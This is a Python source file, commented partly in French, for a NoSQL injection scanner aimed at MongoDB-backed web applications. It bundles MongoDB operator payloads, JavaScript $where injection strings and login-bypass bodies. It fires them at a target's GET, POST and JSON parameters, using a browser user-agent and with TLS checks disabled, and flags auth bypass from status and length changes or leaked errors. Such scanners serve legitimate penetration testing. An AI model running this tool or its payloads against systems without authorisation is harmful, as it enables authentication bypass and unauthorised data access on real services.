"""
NoSQLi Scanner - Detection et exploitation des injections NoSQL.
Supporte MongoDB (operateurs, JSON injection), CouchDB.
"""

import re
import json
import time
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

urllib3.disable_warnings()
console = Console()

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# NoSQL injection payloads organized by technique
NOSQLI_PAYLOADS = {
    "operator_injection": [
        # MongoDB operator injection (query params)
        {"payload": {"$ne": ""}, "description": "Operator $ne (not equal empty)"},
        {"payload": {"$gt": ""}, "description": "Operator $gt (greater than empty)"},
        {"payload": {"$regex": ".*"}, "description": "Operator $regex (match all)"},
        {"payload": {"$exists": True}, "description": "Operator $exists (field exists)"},
        {"payload": {"$nin": []}, "description": "Operator $nin (not in empty)"},
    ],
    "json_injection": [
        # JSON body injection for login bypass
        {"payload": '{"$ne": ""}', "description": "JSON $ne bypass"},
        {"payload": '{"$gt": ""}', "description": "JSON $gt bypass"},
        {"payload": '{"$regex": ".*"}', "description": "JSON $regex bypass"},
        {"payload": '{"$ne": null}', "description": "JSON $ne null bypass"},
    ],
    "javascript_injection": [
        # Server-side JavaScript injection ($where)
        {"payload": "'; return true; var x='", "description": "JS injection return true"},
        {"payload": "1; return true", "description": "JS return true short"},
        {"payload": "'; return '' == '", "description": "JS string comparison bypass"},
        {"payload": "0; return true", "description": "JS numeric return true"},
    ],
    "auth_bypass": [
        # Common auth bypass patterns
        {"payload": {"username": {"$ne": ""}, "password": {"$ne": ""}}, "description": "Auth bypass $ne"},
        {"payload": {"username": {"$gt": ""}, "password": {"$gt": ""}}, "description": "Auth bypass $gt"},
        {"payload": {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "description": "Auth bypass $regex"},
        {"payload": {"username": {"$exists": True}, "password": {"$exists": True}}, "description": "Auth bypass $exists"},
    ],
}


class NoSQLiScanner:
    """Scan a target for NoSQL injection vulnerabilities."""

    def __init__(self, session=None, delay=1):
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self.session.verify = False
        self.delay = delay
        self.results = []

    def scan_url(self, url, method="GET", data=None, params_to_test=None):
        """
        Scan a URL for NoSQL injection.

        Args:
            url: Target URL
            method: HTTP method
            data: POST body data (dict or string)
            params_to_test: List of param names to test (None = all)

        Returns:
            list of vulnerability findings
        """
        self.results = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        console.print(f"\n  [bold cyan]NoSQLi Scan:[/bold cyan] {url[:80]}")
        console.print(f"  [dim]Methode: {method} | Params: {list(query_params.keys())}[/dim]")

        # Get baseline response
        baseline = self._get_baseline(url, method, data)
        if not baseline:
            console.print("  [red]Impossible d'obtenir la reponse de base[/red]")
            return self.results

        # Test GET parameters
        if method.upper() == "GET" and query_params:
            for param_name in query_params:
                if params_to_test and param_name not in params_to_test:
                    continue
                self._test_param_get(url, parsed, query_params, param_name, baseline)

        # Test POST body
        if method.upper() == "POST" and data:
            self._test_post_body(url, data, baseline)

        # Test for JSON API endpoints
        if "application/json" in self.session.headers.get("Content-Type", ""):
            self._test_json_body(url, data, baseline)

        return self.results

    def _get_baseline(self, url, method, data):
        """Get normal response for comparison."""
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=15, allow_redirects=True)
            else:
                resp = self.session.get(url, timeout=15, allow_redirects=True)
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "body": resp.text,
                "headers": dict(resp.headers),
            }
        except Exception as e:
            console.print(f"  [red]Erreur baseline: {e}[/red]")
            return None

    def _test_param_get(self, url, parsed, query_params, param_name, baseline):
        """Test a GET parameter for NoSQL operator injection."""
        console.print(f"\n  [bold]Test param:[/bold] {param_name}")

        for technique, payloads in NOSQLI_PAYLOADS.items():
            if technique == "auth_bypass":
                continue  # Auth bypass is for POST only

            for payload_info in payloads:
                payload = payload_info["payload"]
                desc = payload_info["description"]

                # Build modified URL
                modified_params = dict(query_params)

                if technique == "operator_injection" and isinstance(payload, dict):
                    # Convert {"$ne": ""} to param[$ne]=
                    for op, val in payload.items():
                        key = f"{param_name}[{op}]"
                        modified_params[key] = [str(val)]
                    del modified_params[param_name]
                elif technique == "javascript_injection":
                    modified_params[param_name] = [str(payload)]
                elif technique == "json_injection":
                    modified_params[param_name] = [str(payload)]
                else:
                    continue

                # Build new URL
                new_query = urlencode(modified_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

                result = self._send_and_compare(test_url, "GET", None, baseline, param_name, desc, technique)
                if result:
                    self.results.append(result)

                time.sleep(self.delay)

    def _test_post_body(self, url, data, baseline):
        """Test POST body parameters for NoSQL injection."""
        console.print(f"\n  [bold]Test POST body[/bold]")

        # Parse body data
        if isinstance(data, str):
            try:
                body_params = json.loads(data)
                is_json = True
            except json.JSONDecodeError:
                body_params = dict(parse_qs(data, keep_blank_values=True))
                body_params = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in body_params.items()}
                is_json = False
        elif isinstance(data, dict):
            body_params = data.copy()
            is_json = False
        else:
            return

        # Test operator injection on each param
        for param_name in list(body_params.keys()):
            for technique in ("operator_injection", "auth_bypass"):
                for payload_info in NOSQLI_PAYLOADS.get(technique, []):
                    payload = payload_info["payload"]
                    desc = payload_info["description"]

                    modified = body_params.copy()
                    if technique == "auth_bypass" and isinstance(payload, dict):
                        modified.update(payload)
                    elif isinstance(payload, dict):
                        modified[param_name] = payload
                    else:
                        modified[param_name] = str(payload)

                    if is_json:
                        send_data = json.dumps(modified)
                        result = self._send_and_compare(url, "POST", send_data, baseline, param_name, desc, technique, content_type="application/json")
                    else:
                        # For operator injection in form data: param[$ne]=
                        if isinstance(modified[param_name], dict):
                            flat = {}
                            for k, v in modified.items():
                                if isinstance(v, dict):
                                    for op, val in v.items():
                                        flat[f"{k}[{op}]"] = str(val)
                                else:
                                    flat[k] = v
                            send_data = urlencode(flat)
                        else:
                            send_data = urlencode(modified)
                        result = self._send_and_compare(url, "POST", send_data, baseline, param_name, desc, technique)

                    if result:
                        self.results.append(result)
                    time.sleep(self.delay)

    def _test_json_body(self, url, data, baseline):
        """Test JSON API endpoint for NoSQL injection."""
        if not data:
            return

        try:
            body = json.loads(data) if isinstance(data, str) else data
        except (json.JSONDecodeError, TypeError):
            return

        if not isinstance(body, dict):
            return

        console.print(f"\n  [bold]Test JSON body[/bold]")

        for param_name in list(body.keys()):
            for payload_info in NOSQLI_PAYLOADS["operator_injection"]:
                modified = body.copy()
                modified[param_name] = payload_info["payload"]
                send_data = json.dumps(modified)

                result = self._send_and_compare(
                    url, "POST", send_data, baseline, param_name,
                    payload_info["description"], "json_operator",
                    content_type="application/json"
                )
                if result:
                    self.results.append(result)
                time.sleep(self.delay)

    def _send_and_compare(self, url, method, data, baseline, param, desc, technique, content_type=None):
        """Send request and compare with baseline to detect injection."""
        try:
            headers = {}
            if content_type:
                headers["Content-Type"] = content_type

            if method == "POST":
                resp = self.session.post(url, data=data, headers=headers, timeout=15, allow_redirects=True)
            else:
                resp = self.session.get(url, headers=headers, timeout=15, allow_redirects=True)

            status = resp.status_code
            length = len(resp.text)
            body = resp.text

            # Detection heuristics
            is_vuln = False
            confidence = "LOW"
            reason = ""

            # Status code change (e.g. 401 -> 200)
            if baseline["status"] != status:
                if status == 200 and baseline["status"] in (401, 403, 302):
                    is_vuln = True
                    confidence = "HIGH"
                    reason = f"Status change: {baseline['status']} -> {status} (auth bypass?)"
                elif abs(baseline["status"] - status) >= 100:
                    is_vuln = True
                    confidence = "MEDIUM"
                    reason = f"Status change: {baseline['status']} -> {status}"

            # Significant length difference (different content returned)
            length_diff = abs(length - baseline["length"])
            length_ratio = length_diff / max(baseline["length"], 1)
            if length_ratio > 0.3 and length > baseline["length"]:
                if not is_vuln:
                    is_vuln = True
                    confidence = "MEDIUM"
                    reason = f"Response length: {baseline['length']} -> {length} (+{length_diff})"

            # MongoDB error messages in response
            mongo_errors = [
                "MongoError", "MongoDB", "BSON", "$where", "SyntaxError",
                "ReferenceError", "unterminated string", "invalid operator",
                "bad query", "no such command", "CommandNotFound",
            ]
            for err in mongo_errors:
                if err.lower() in body.lower() and err.lower() not in baseline["body"].lower():
                    is_vuln = True
                    confidence = "HIGH"
                    reason = f"MongoDB error leaked: {err}"
                    break

            if is_vuln:
                console.print(f"    [bold red]VULNERABLE[/bold red] [{confidence}] {desc}")
                console.print(f"      [dim]{reason}[/dim]")
                return {
                    "param": param,
                    "technique": technique,
                    "description": desc,
                    "confidence": confidence,
                    "reason": reason,
                    "status_code": status,
                    "response_length": length,
                    "url": url[:200],
                }
            else:
                console.print(f"    [dim]OK: {desc}[/dim]")
                return None

        except Exception as e:
            console.print(f"    [yellow]Erreur: {e}[/yellow]")
            return None

    def get_results_summary(self):
        """Return a summary of findings."""
        if not self.results:
            return None
        return {
            "total_findings": len(self.results),
            "high_confidence": len([r for r in self.results if r["confidence"] == "HIGH"]),
            "medium_confidence": len([r for r in self.results if r["confidence"] == "MEDIUM"]),
            "techniques": list(set(r["technique"] for r in self.results)),
            "params": list(set(r["param"] for r in self.results)),
            "details": self.results,
        }
